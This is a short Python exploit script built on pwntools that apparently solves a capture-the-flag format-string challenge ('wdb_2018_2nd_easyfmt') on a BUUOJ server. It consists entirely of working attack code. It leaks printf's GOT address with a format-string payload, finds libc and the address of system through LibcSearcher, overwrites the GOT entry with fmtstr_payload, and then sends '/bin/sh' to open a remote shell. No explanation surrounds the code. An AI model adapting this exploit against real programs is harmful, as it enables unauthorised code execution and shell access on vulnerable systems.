from pwn import *
from LibcSearcher import *

context.log_level='debug'

p=remote("node3.buuoj.cn",29131)
#p=process('./wdb_2018_2nd_easyfmt')
elf=ELF('./wdb_2018_2nd_easyfmt')


printf_got=elf.got["printf"]

payload=p32(printf_got)+"%6$s"
p.sendlineafter("repeater?\n",payload)
p.recv(4)
printf_addr = u32(p.recv(4))
print("printf_addr ---> ",hex(printf_addr))

libc=LibcSearcher('printf',printf_addr)
libc_base=printf_addr-libc.dump('printf')
system_addr=libc_base+libc.dump('system')

#libc=ELF('./libc-2.23(32).so')
#libc_base=printf_addr-libc.symbols["printf"]
#system_addr=libc_base+libc.symbols['system']
print("system_addr ---> ",hex(system_addr))

payload=fmtstr_payload(6,{
    printf_got:system_addr})
p.sendline(payload)
p.sendline('/bin/sh\x00')

p.interactive()

